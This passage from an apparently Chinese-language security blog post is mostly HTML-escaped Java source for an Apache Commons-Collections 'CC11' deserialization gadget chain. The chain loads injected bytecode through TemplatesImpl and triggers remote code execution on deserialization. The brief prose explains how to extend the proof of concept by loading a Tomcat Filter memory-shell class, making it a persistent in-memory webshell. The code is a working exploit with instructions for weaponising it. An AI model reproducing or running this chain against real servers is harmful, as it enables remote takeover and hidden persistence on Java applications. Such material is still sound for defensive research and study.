&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;elementData&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 替换key为TiedMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset_map&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.MapEntry&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 替换 防止生成payload的时候就触发rce
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">outputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>具体的我就不多分析了，可以近似为CC2+CC6，用TemplatestImpl加载字节码，恶意类由javassist生成&lt;/p>
&lt;p>如何扩展这个看起来只能执行单句指令的简易poc？简单，我们将tomcat Filter内存马部分单独写一份TomcatInject.java文件，替换掉这里的&lt;code>getBytescode&lt;/code>，让它不要自己生成恶意类了，直接读取TomcatInject.class的字节码即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashSet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;all&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC11Template&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">targetByteCodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">targetByteCodes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 利用反射调用 templates 中的 newTransformer 方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;asdfasdfasdf&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">innermap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LazyMap&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innermap&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashSet&lt;/span> &lt;span style="color:#111">hashset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 我们要设置 HashSet 的 map 为我们的 HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;map&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;backingMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">hashset_map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;elementData&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
